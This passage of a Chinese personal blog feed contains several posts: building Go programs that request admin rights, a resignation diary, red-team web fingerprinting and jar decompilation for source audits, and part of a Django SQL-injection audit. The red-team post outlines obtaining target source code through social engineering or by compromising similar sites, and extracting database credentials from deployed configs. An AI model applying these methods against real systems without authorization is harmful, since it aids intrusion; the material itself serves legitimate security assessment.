class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> standalone=<span class="hljs-string">&quot;yes&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">assembly</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span> <span class="hljs-attr">manifestVersion</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">trustInfo</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">security</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">requestedPrivileges</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">requestedExecutionLevel</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;requireAdministrator&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">requestedPrivileges</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">security</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">trustInfo</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">assembly</span>&gt;</span><br></code></pre></td></tr></table></figure><p>网上部分转载摘抄的文章中有的少抄了最后一行，会导致程序抛出异常，<code>报错：应用程序无法启动，因为应用程序的并行配置不正确。有关详细信息，请参阅应用程序事件日志，或使用命令行 sxstrace.exe 工具。</code><br><img src="/img/20210428-02.png" alt="20210428-02"></p><h3 id="2、编译-syso"><a href="#2、编译-syso" class="headerlink" title="2、编译 *.syso"></a>2、编译 *.syso</h3><p>编译命令如下:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">rsrc -manifest .\<span class="hljs-keyword">test</span>.manifest -o <span class="hljs-keyword">test</span>.syso<br></code></pre></td></tr></table></figure><p>文件名没啥要求</p><h3 id="3、go编译打包"><a href="#3、go编译打包" class="headerlink" title="3、go编译打包"></a>3、go编译打包</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">go build</span><br></code></pre></td></tr></table></figure><p>然后测试运行一下，看是否提示申请管理员权限。</p><h3 id="4、优化"><a href="#4、优化" class="headerlink" title="4、优化"></a>4、优化</h3><p>如果需要做到windows全系列兼容，可以在<code>&lt;assembly&gt;</code>标签下面增加以下内容：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-comment">&lt;!-- OSVersion --&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">compatibility</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-microsoft-com:compatibility.v1&quot;</span>&gt;</span>   </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">application</span>&gt;</span>   </span><br><span class="language-xml">            <span class="hljs-comment">&lt;!-- Windows 10 --&gt;</span>   </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">supportedos</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">supportedos</span>&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-comment">&lt;!-- Windows 8.1/Windows Blue/Server 2012 R2 --&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">supportedos</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;1f676c76-80e1-4239-95bb-83d0f6d0da78&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">supportedos</span>&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-comment">&lt;!-- Windows Vista/Server 2008 --&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">supportedos</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;e2011457-1546-43c5-a5fe-008deee3d3f0&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">supportedos</span>&gt;</span>   </span><br><span class="language-xml">            <span class="hljs-comment">&lt;!-- Windows 7/Server 2008 R2 --&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">supportedos</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;35138b9a-5d96-4fbd-8e2d-a2440225f93a&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">supportedos</span>&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-comment">&lt;!-- Windows 8/Server 2012 --&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">supportedos</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">supportedos</span>&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span>   </span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">compatibility</span>&gt;</span>  </span><br></code></pre></td></tr></table></figure><p>支持Windows 6.0界面库、支持管理员权限、兼容WIN8&#x2F;WIN10下取系统版本、兼容DPI Aware，完整manifest可以参考<a href="https://blog.csdn.net/cometnet/article/details/52995192">https://blog.csdn.net/cometnet/article/details/52995192</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/sbscs/application-manifests">https://docs.microsoft.com/en-us/windows/win32/sbscs/application-manifests</a>【Application Manifests】</li><li><a href="https://blog.csdn.net/cometnet/article/details/52995192">https://blog.csdn.net/cometnet/article/details/52995192</a>【比较完整的Windows应用程序清单文件 manifest.xml】</li><li><a href="https://github.com/akavel/rsrc">https://github.com/akavel/rsrc</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>你为什么从当前的公司离职</title>
    <link href="/2021/04/25/2021-04-25-before-departure/"/>
    <url>/2021/04/25/2021-04-25-before-departure/</url>
    
    <content type="html"><![CDATA[<p>你为什么从当前的公司离职</p><hr><p>今天是XX成立21周年纪念日，就在前天我和领导提了离职，领导至今都未回复我，无论是工作繁忙，还是其他原因，不过我并不关注，了解的越多只会让自己更伤心。</p><p>知乎上有一个帖子，帖子的名称为《你为什么从XX离职》。至今我每年都会上去看看，每年都会增加几条答复，每个人走的时候可能是钱没给够也可能是受了委屈，理由很多，走的时候都想踩公司一脚。每年都会看一遍，每年的感触都不一样。17年看的时候是迷茫，怀疑自己是否来对了公司；18年看的时候，在判断是否自己真的可以在公司闯出一片天地；19年，被公司的低薪水整的焦头烂额，但是工作还算轻松，女友一直陪伴，顶着委屈压力，一直干；20年，顶着疫情压力，在客户现场做代码审计，项目人均单价历史第一，成功干趴友商，最来气的是年底核算业绩，竟然以base变动，不作为绩效计算条件，期间也动过离职的想法，但是当前团队还算稳定，工作也游刃有余，但是自己个人能力发展一般，犹豫了很久，然后选择了继续努力；21年，当我开始为生计考虑的时候，领导年初突然离职，计划一下子被打乱了，工作内容多元化，事务性的工作成了常态，我迷茫了，我不清楚该怎么做，做事的尺度是多少，除了工作，个人该如何发展。</p><p>让我敬佩的一个公司前辈调岗回来担任我的领导，本来是一件不错的事情，可以继续把团队扩展一下，然而公司战略调整，销售大量离职，人人自危，派系打压严重，之前谈好的项目拱手让人，新晋人员无法对接，再加上领导在未到帝都述职之前就让我交出手上的研发的平台并且指定了一个不靠谱的方向（不靠谱的原因主要是他当年带领了一个开发小组干了一年都没有成功的项目，现在让我带两个人去弄），前前后后谈了好几次，最后我妥协了，我不想在这个问题上浪费时间，都准备走了，领导说啥就是啥吧，前领导由于非嫡系，能为我们争取到的福利待遇比较少，这次调薪只给我一个人调整，可能因为在领导层面觉得我比我女友能力强，又或者觉得给我涨薪，我留下，我女友就可以留下来吧，并且安全开发这个方向可以继续推广下去，这些都是神逻辑。新领导来了直接说能不能帮女友找个新的下家，本来女友还没有换工作的想法，纯粹被挤兑的有些难受，这些之前并没有和女友说，默默协助她在找工作投offer，不想摧毁她对这家公司的信仰，现在已如此，已经无所畏惧。用某副总的话来说，我有钱什么人招不到，如此人情薄凉的企业，我还是走吧。</p><p>公司问题有很多，但是我并不能改变什么，人微言轻，谁会在乎一个小工程师的只言片语，谁会在乎在全国疫情恐慌的时候，大家都龟缩在家里办公的时候，自己却带着女友同事去做代码审计，谁会在乎一个小工程师在客户现场不能吃公司食堂而被行政告知无法享受公司一个月几百块饭补福利，谁又会在乎一个小工程师每年为公司盈利几百万却为了团队和个人的绩效去求领导的无奈……说了这么多，我感到有些无奈，有些心累。</p><p>公司21周年大会上，司龄15年的前辈小钻风的发言稿里面有一段话是这样说的“有人说，公司现在“物是人非”了，我不是知情人，无法判断，但至少我自己没有改变，还是研究部的一颗螺丝钉。今年是我第四个15年的开始，一切从零开始，我愿和新老同学们共同奋斗下一个15年，之后我就可以光荣退休了。”其实能在公司待到15年以上的，都是大熊猫级别的存在，挺羡慕前辈们可以畅所欲言，指点江山。我曾经抱着信仰来，带着不甘委屈离去，对于前辈们，你们仍是我的信仰，在技术道路上我会不断砥砺前行，但是XX我可能待不下去了，祝各位大佬在技术的道路上披荆斩棘，所向无敌。</p> <p align="right">------离职前夕</p>]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在渗透测试过程中通过源代码审计进行漏洞挖掘</title>
    <link href="/2021/04/08/2021-04-08-vulnerability-mining-within-pentest/"/>
    <url>/2021/04/08/2021-04-08-vulnerability-mining-within-pentest/</url>
    
    <content type="html"><![CDATA[<p>在渗透测试过程中通过源代码审计进行漏洞挖掘</p><hr><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>在对抗性测试过程中，攻击队攻击的资产通常被防守方层层防护，明显的漏洞在前期资产排查的时候基本上被修复的七七八八。要想获得不错的战果，必须得出奇招。如果能对防护的站点进行源代码审计，或者对相似的站点进行代码审计，那将进一步扩大战果。之前在某对抗性测试过程中，发现某安全大厂，在测试过程中，通过前期信息收集，全网检索相似站点或者CMS，直接测试对应站点（做好防护）或者下载对应cms源码进行源代码审计，方法很笨，但是很有效。</p><p>首先对web站点进行信息收集，获取对应web指纹，使用搜索引擎，fofa,shadon等工具，全网检索，获取相似站点信息，我们重点关注源代码。获取源码来源有很多，可能是cms,也可能是通过github、其他代码脱管平台及网盘泄露出来的源代码，或者通过旁站入侵等方式获取到部署文件等等，总之获取到对应站点源码即可，方法随意，然后迅速进行漏洞挖掘并利用。公司一红蓝对抗师傅形象的称之为现场挖0day，接下来我总结一下在红蓝对抗过程中的一些源代码审计技巧和检验。</p><h2 id="web指纹识别方法"><a href="#web指纹识别方法" class="headerlink" title="web指纹识别方法"></a>web指纹识别方法</h2><p>包括但不仅限于以下这5中方法，灵活判断，达到目的即可</p><h3 id="特定文件hash"><a href="#特定文件hash" class="headerlink" title="特定文件hash"></a>特定文件hash</h3><p>一些网站的特定图片文件、js文件、CSS等静态文件，如favicon.ico、css、logo.ico、js等文件一般不会修改，通过爬虫对这些文件进行抓取并比对md5值，如果和规则库中的Md5一致则说明是同一CMS。这种方式速度比较快，误报率相对低一些，但也不排除有些二次开发的CMS会修改这些文件。</p><h3 id="正常页面或者错误网页中包含的关键字"><a href="#正常页面或者错误网页中包含的关键字" class="headerlink" title="正常页面或者错误网页中包含的关键字"></a>正常页面或者错误网页中包含的关键字</h3><p>先访问首页或特定页面如robots.txt等，通过正则的方式去匹配某些关键字，如Powered by Discuz、dedecms等。或者可以构造错误页面，根据报错信息来判断使用的CMS或者中间件信息，比较常见的如tomcat的报错页面，thinkphp的报错页面。</p><h3 id="请求头信息的关键字匹配"><a href="#请求头信息的关键字匹配" class="headerlink" title="请求头信息的关键字匹配"></a>请求头信息的关键字匹配</h3><p>根据网站response返回头信息进行关键字匹配，whatweb和Wappalyzer就是通过banner信息来快速识别指纹，之前fofa的web指纹库很多都是使用的这种方法，效率非常高，基本请求一次就可以，但搜集这些规则可能会耗时很长。而且这些banner信息有些很容易被改掉。<br>根据response header一般有以下几种识别方式：</p><pre><code>（1）查看http响应报头的X-Powered-By字段来识别；（2）根据Cookies来进行判断，比如一些waf会在返回头中包含一些信息，如360wzws、Safedog、yunsuo等；（3）根据header中的Server信息来判断，如DVRDVS-Webs、yunjiasu-nginx、Mod_Security、nginx-wallarm等；（4）根据WWW-Authenticate进行判断，一些路由交换设备可能存在这个字段，如NETCORE、huawei、h3c等设备。</code></pre><h3 id="部分URL中包含的关键字，比如wp-includes、dede等URL关键特征"><a href="#部分URL中包含的关键字，比如wp-includes、dede等URL关键特征" class="headerlink" title="部分URL中包含的关键字，比如wp-includes、dede等URL关键特征"></a>部分URL中包含的关键字，比如wp-includes、dede等URL关键特征</h3><p>通过规则库去探测是否有相应目录，或者根据爬虫结果对链接url进行分析，或者对robots.txt文件中目录进行检测等等方式，通过url地址来判别是否使用了某CMS，比如wordpress默认存在wp-includes和wp-admin目录，织梦默认管理后台为dede目录，solr平台可能使用&#x2F;solr目录，weblogic可能使用wls-wsat目录等。</p><h3 id="开发语言的识别"><a href="#开发语言的识别" class="headerlink" title="开发语言的识别"></a>开发语言的识别</h3><p>web开发语言一般常见的有PHP、jsp、aspx、asp等，常见的识别方式有：<br>（1）通过爬虫获取动态链接进行直接判断是比较简便的方法。<br>    asp判别规则如下&lt;a[^&gt;]<em>?href&#x3D;(‘|”)[^http][^&gt;]</em>?.asp(?|#|\1)，其他语言可替换相应asp即可。<br>（2）通过X-Powered-By进行识别<br>    比较常见的有X-Powered-By: ASP.NET或者X-Powered-By: PHP&#x2F;7.1.8<br>（3）通过Set-Cookie进行识别<br>    这种方法比较常见也很快捷，比如Set-Cookie中包含PHPSSIONID说明是php、包含JSESSIONID说明是java、包含ASP.NET_SessionId说明是aspx等。</p><h2 id="web指纹识别工具"><a href="#web指纹识别工具" class="headerlink" title="web指纹识别工具"></a>web指纹识别工具</h2><p>web指纹识别工具有很多，我推荐几款我常用的。</p><h3 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h3><p>Whatweb 是一个开源的网站指纹识别软件，拥有超过1700+个插件，它能识别的指纹包括 cms 类型、博客平台、网站流量分析软件、javascript 库、网站服务器，还可以识别版本号、邮箱地址、账户 id、web 框架模块等。kali里面集成了，其他发行版本自行安装。</p><h3 id="w11scan"><a href="#w11scan" class="headerlink" title="w11scan"></a>w11scan</h3><p>w11scan是一款分布式的WEB指纹识别系统（包括CMS识别、js框架、组件容器、代码语言、WAF等等），管理员可以在WEB端新增&#x2F;修改指纹，建立批量的扫描任务，并且支持多种搜索语法。<br>安装和下载可参考：<a href="https://github.com/w-digital-scanner/w11scan">https://github.com/w-digital-scanner/w11scan</a><br>手工安装稍微复杂，不过作者提供了docker部署，方便很多，使用了Mongodb，内置了1800多条常见的指纹，可以识别多达538种常见CMS，当然也可以手工添加指纹。</p><h3 id="ehole"><a href="#ehole" class="headerlink" title="ehole"></a>ehole</h3><p>EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、VPN、Weblogic…)。EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。</p><h2 id="代码反编译"><a href="#代码反编译" class="headerlink" title="代码反编译"></a>代码反编译</h2><p>如果能成功获取到源代码，可以直接略过此条目。这里主要是获取到部署文件，war包，jar包，或者直接打包的class文件，通过反编译，进行源代码审计。以下是个人常用的几种工具，个人比较推荐使用IDEA，直接调用IDEA的java-decompiler组件进行反编译，也方便进行调试分析。萝卜青菜，各有所爱，各位依据自身情况选择工具。</p><h3 id="IDEA-java-decompiler-jar"><a href="#IDEA-java-decompiler-jar" class="headerlink" title="IDEA java-decompiler.jar"></a>IDEA java-decompiler.jar</h3><p>1、直接使用IDEA打开我们需要分析的war包工程，IDEA会自动帮助我们将class进行反编译并展示出来，节约了我们好多工作。<br><img src="/img/20210408-03.png" alt="20210408-03"><br>对于jar包，将jar所在的目录设置成library<br><img src="/img/20210408-04.png" alt="20210408-04"><br><img src="/img/20210408-05.png" alt="20210408-05"><br>jar包可以直接打开，方便进行分析。<br><img src="/img/20210408-06.png" alt="20210408-06"><br>也可以在项目结构(Project Structure)中配置Libraray.</p><p>2、直接调用IDEA java-decompiler.jar进行反编译<br>java-decompiler.jar默认是安装的，位于IDEA安装目录\plugins\java-decompiler\lib\，博主本人java-decompiler.jar目录为：D:\Program\IntelliJ IDEA 2018.1.6\plugins\java-decompiler\lib ，主要是接下来会用到。<br><img src="/img/20210408-07.png" alt="20210408-07"><br>创建一个目录，用来存储反编译后的文件，如test文件夹。我这里拿FrontDemoController.class来举例：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">java <span class="hljs-operator">-</span>cp <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\P</span>rogram<span class="hljs-char escape_">\I</span>ntelliJ IDEA 2018.1.6<span class="hljs-char escape_">\p</span>lugins<span class="hljs-char escape_">\j</span>ava-decompiler<span class="hljs-char escape_">\l</span>ib<span class="hljs-char escape_">\j</span>ava-decompiler.jar&quot;</span> org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler <span class="hljs-operator">-</span>dgs<span class="hljs-operator">=</span><span class="hljs-literal">true</span> .\FrontDemoController.class .\test\<br></code></pre></td></tr></table></figure><p><img src="/img/20210408-08.png" alt="20210408-08"><br>这样可以将FrontDemoController.class直接反编译成FrontDemoController.java。对于jar包，反编译结果也打包成jar包，这点儿需要注意，你直接使用压缩工具解压即可。这里拿dom4j这个jar来举例，以下截图是反编译以后使用压缩工具解压jar的结果，可以明显看出jar包中的class文件均被反编译成java。<br><img src="/img/20210408-09.png" alt="20210408-09"></p><p>java-decompiler.jar底层是使用fernflower实现的：<br><a href="https://github.com/fesh0r/fernflower">https://github.com/fesh0r/fernflower</a> 有兴趣的朋友，可以到github上查看查阅源码</p><h3 id="jad"><a href="#jad" class="headerlink" title="jad"></a>jad</h3><p>JAD 是一款老牌的、经典的、使用起来简单的 Java 反编译工具,可以通过命令行把Java的class文件反编译成源代码。<br>下载地址：<a href="http://www.varaneckas.com/jad">http://www.varaneckas.com/jad</a><br><img src="/img/20210408-01.png" alt="20210408-01"><br>使用方法：<br>1、反编译一个class文件：jad.exe -sjava example.class，会生成example.java，用文本编辑器打开就是java源代码<br>2、把源代码文件输出到指定的目录：jad -dnewdir -sjava example.class，在newdir目录下生成example.java<br>3、把packages目录下的class文件全部反编译：jad -sjava packages&#x2F;<em>.class<br>4、把packages目录以及子目录下的文件全部反编译：jad -sjava packages&#x2F;**&#x2F;</em>.class，不过你仍然会发现所有的源代码文件被放到了同一个文件中，没有按照class文件的包路径建立起路径<br>5、把packages目录以及子目录下的文件全部反编译并建立和java包一致的文件夹路径，可以使用-r命令：jad -r -sjava packages&#x2F;**&#x2F;*.class</p><p>常用的也就是第5条，各位根据自己需求进行操作，一些特殊的需求详见参考中的jad命令总结链接。<br><img src="/img/20210408-02.png" alt="20210408-02"><br>注意：jad不支持中文，如果反编译结果中出现部分unicode乱码，请自行解码分析。jad不能直接反编译jar包，直接解压了再反编译。</p><h3 id="jd-gui"><a href="#jd-gui" class="headerlink" title="jd-gui"></a>jd-gui</h3><p>jd-gui是一款反编译软件，JD分为JD-GUI、JD-Eclipse两种运行方式，JD-GUI是以单独的程序的方式运行，JD-Eclipse则是以一个Eclipse插件的方式运行。该工具不做过多评论，反编译效果不错，操作傻瓜化，各位看官自行挑选即可。<br>下载地址：<a href="https://github.com/java-decompiler/jd-gui/releases">https://github.com/java-decompiler/jd-gui/releases</a></p><h2 id="快速漏洞挖掘"><a href="#快速漏洞挖掘" class="headerlink" title="快速漏洞挖掘"></a>快速漏洞挖掘</h2><h3 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a>方法论</h3><p>1、通过web指纹匹配，采用社工，渗透等方式从其他脆弱目标获取当前资产的部分源代码<br>2、使用工具和人工审计的方式进行漏洞挖掘<br>3、尝试快速搭建漏洞验证环境进行验证，构建payload</p><h3 id="源代码评估工具"><a href="#源代码评估工具" class="headerlink" title="源代码评估工具"></a>源代码评估工具</h3><p>fortify sca , checkmarx </p><h3 id="快速源代码漏洞挖掘技巧"><a href="#快速源代码漏洞挖掘技巧" class="headerlink" title="快速源代码漏洞挖掘技巧"></a>快速源代码漏洞挖掘技巧</h3><h4 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h4><h5 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h5><h5 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h5><h4 id="文件上传-x2F-下载"><a href="#文件上传-x2F-下载" class="headerlink" title="文件上传&#x2F;下载"></a>文件上传&#x2F;下载</h4><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>1、web系统被打包成jar包，反编译发现配置信息和现有环境相悖<br>攻击队的同学想扩大战果，通过分析前场同学提供的web程序，网站部署程序文件被打包成jar包，从jar包中获取application.yml进行分析，提取出数据库的地址，用户名，密码，直接访问发现连接失败，这就需要<br>攻击队的同学注意了，spring程序可能从外部加载配置文件，jar中的配置文件可能是研发人员的测试环境配置文件。Spring程序会按优先级从下面这些路径来加载application.properties配置文件</p><pre><code>* 当前目录下的/config目录* 当前目录* classpath里的/config目录* classpath 跟目录</code></pre><p>因此，在进一步测试的过程中，需要关注在jar所在目录是否存在config文件夹，或者jar目录下是否存在application.yml配置文件</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://cloud.tencent.com/developer/article/1429137">https://cloud.tencent.com/developer/article/1429137</a>【Web指纹识别技术研究与优化实现】</li><li><a href="http://www.blogjava.net/supercrsky/articles/199217.html">http://www.blogjava.net/supercrsky/articles/199217.html</a>【jad命令总结】</li><li><a href=""></a>【】</li><li><a href=""></a>【】</li><li><a href=""></a>【】</li><li><a href=""></a>【】</li><li><a href=""></a>【】</li><li><a href=""></a>【】</li><li><a href=""></a>【】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Code Audit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次基于django二次开发系统业务源代码审计</title>
    <link href="/2021/03/18/2021-03-18-auditing-of-secondary-development-system-based-on-django-fiamework/"/>
    <url>/2021/03/18/2021-03-18-auditing-of-secondary-development-system-based-on-django-fiamework/</url>
    
    <content type="html"><![CDATA[<p>记一次基于django二次开发系统业务源代码审计</p><hr><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>突然被领导拉去协助产研的同学做代码审计，审计的系统是一个后端业务系统，系统基于django框架做的二次开发，我只负责审计业务代码即可。审计过程中遇到一个文件上传点未按照编码规范，使用拼接的形式查询数据而导致的sql注入漏洞，听起来很魔幻，又因为在审计过程中对于postgresql语法生疏，一定要记录一下，否则后续还得花费时间学习。</p><h2 id="django-如何防止sql注入"><a href="#django-如何防止sql注入" class="headerlink" title="django 如何防止sql注入"></a>django 如何防止sql注入</h2><blockquote><p>防御 SQL 注入</p><p>SQL 注入是一种让恶意用户能在数据库中执行任意 SQL 代码的攻击方式。这将导致记录被删除或泄露。<br>Django 的 querysets 在被参数化查询构建出来时就被保护而免于 SQL 注入。查询的 SQL 代码与查询的参数是分开定义的。参数可能来自用户从而不安全，因此它们由底层数据库引擎进行转义。<br>Django 也为开发者提供了书写 raw queries 或执行 custom sql 的权利。应当尽可能少地使用这些方法，并且您应该小心并准确的转义一切用户可控的参数。另外，在使用 extra() 和 RawSQL 时应当小心谨慎。<br>参数化查询在Django的ORM中无处不在，因此对于SQLi具有很强的防御能力，但是，在一些情况下，还是得注意注入，极少数的API并非100%安全。</p></blockquote><p>有时django ORM不足以满足业务复杂度需求，需要使用原生SQL。不过在此之前，还请考虑是否有避免这种情况的方法。当然某些情况下，无法避免原生SQL，虽说可以通过一些django API来实现，不过不够保证安全。</p><h3 id="执行原生查询"><a href="#执行原生查询" class="headerlink" title="执行原生查询"></a>执行原生查询</h3><p>可以使用 Manager.raw() 来执行原生查询并返回模型实例，如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Manager.raw(raw_query, <span class="hljs-attribute">params</span>=None, <span class="hljs-attribute">translations</span>=None)¶<br></code></pre></td></tr></table></figure><p>该方法接受一个原生 SQL 查询语句，执行它，并返回一个 django.db.models.query.RawQuerySet 实例。这个 RawQuerySet 能像普通的 QuerySet 一样被迭代获取对象实例。<br>例如：<br><img src="/img/20210318-02.png" alt="20210318-02"></p><p>对于具体用法我们不过多说明，这里重点强调的是将参数传给raw(),可以使用 raw() 的 params 参数:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">lname = <span class="hljs-string">&#x27;Doe&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">Person.objects.raw(<span class="hljs-string">&#x27;SELECT * FROM myapp_person WHERE last_name = %s&#x27;</span>, [lname])</span><br></code></pre></td></tr></table></figure><p>params 是一个参数字典。你将用一个列表替换查询字符串中 %s 占位符，或用字典替换 %(key)s 占位符（key 被字典 key 替换），不论你使用哪个数据库引擎。这些占位符会被 params 参数的值替换。</p><p>特别强调一下，不要对原生查询或SQL字符串中的引号占位符使用字符串格式化，反例如下：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">query = <span class="hljs-string">&#x27;SELECT * FROM myapp_person WHERE last_name = %s&#x27;</span> % lname</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">Person.objects.raw(query)</span><br></code></pre></td></tr></table></figure><p>这样相当于直接将lname参数拼接到sql语句中，进而导致了sql注入</p><h3 id="直接执行自定义SQL"><a href="#直接执行自定义SQL" class="headerlink" title="直接执行自定义SQL"></a>直接执行自定义SQL</h3><blockquote><p>有时候，甚至 Manager.raw() 都无法满足需求：你可能要执行不明确映射至模型的查询语句，或者就是直接执行 UPDATE， INSERT 或 DELETE 语句。<br>这些情况下，你总是能直接访问数据库，完全绕过模型层。<br>对象 django.db.connection 代表默认数据库连接。要使用这个数据库连接，调用 connection.cursor() 来获取一个指针对象。然后，调用 cursor.execute(sql, [params]) 来执行该 SQL 和 cursor.fetchone()，或 cursor.fetchall() 获取结果数据<br>以上是官方wiki中说明的直接执行自定义SQL方法，对于参数的传递同样使用占位符的形式，wiki中并未提及extra方法。</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">extra(<span class="hljs-attribute">select</span>=None, <span class="hljs-attribute">where</span>=None, <span class="hljs-attribute">params</span>=None, <span class="hljs-attribute">tables</span>=None, <span class="hljs-attribute">order_by</span>=None, <span class="hljs-attribute">select_params</span>=None)<br></code></pre></td></tr></table></figure><p>extra()函数提供QuerySet修改机制，它能在 QuerySet生成的SQL从句中注入新子句。</p><p>extra可以指定一个或多个 参数,例如 select, where or tables. 这些参数都不是必须的，但是你至少要使用一个，研发前辈给的建议是，要注意这些额外的方式对不同的数据库引擎可能存在移植性问题(因为你在显式的书写SQL语句),除非万不得已,尽量避免这样做。如果在审计过程中遇到，一定打起十二分的精神去分析。</p><h2 id="缺陷代码分析"><a href="#缺陷代码分析" class="headerlink" 